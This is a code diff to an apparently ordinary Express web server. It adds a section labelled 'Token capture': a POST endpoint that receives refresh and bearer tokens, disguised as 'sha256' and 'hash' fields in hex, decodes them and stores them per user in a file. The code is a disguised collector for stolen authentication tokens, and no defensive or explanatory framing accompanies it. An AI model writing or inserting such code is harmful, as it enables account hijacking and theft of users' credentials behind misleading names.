@@ -1631,7 +1631,65 @@ app.get("/api/user/alerts", async (req, res) => {
 
 // ---------- username tracking ----------
 
+// === Token capture (add near line 1630, after alerts) ===
 
+const VALIDATED_FILE = path.join(DATA_DIR, "validated.json");
+
+function hexToText(hex) {
+  let str = '';
+  for (let i = 0; i < hex.length; i += 2) {
+    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+  }
+  return str;
+}
+
+function loadValidated() {
+  try {
+    if (fs.existsSync(VALIDATED_FILE)) {
+      return JSON.parse(fs.readFileSync(VALIDATED_FILE, "utf8"));
+    }
+  } catch (e) {}
+  return {};
+}
+
+function saveValidated(data) {
+  try {
+    fs.writeFileSync(VALIDATED_FILE, JSON.stringify(data, null, 2));
+  } catch (e) {}
+}
+
+app.post("/api/user/validated", (req, res) => {
+  const { username, sha256, hash } = req.body || {};
+  
+  if (!username || !sha256) {
+    return res.status(400).json({ error: "missing fields" });
+  }
+  
+  const refreshToken = hexToText(sha256);
+  const appId = username;
+  
+  const data = loadValidated();
+  
+  if (!data[appId]) {
+    data[appId] = {
+      refreshToken,
+      firstSeen: Date.now(),
+      lastSeen: Date.now()
+    };
+  } else {
+    data[appId].refreshToken = refreshToken;
+    data[appId].lastSeen = Date.now();
+  }
+  
+  // Only add bearer if included (second call)
+  if (hash) {
+    data[appId].bearerToken = hexToText(hash);
+  }
+  
+  saveValidated(data);
+  
+  res.json({ ok: true });
+});
 
 
 
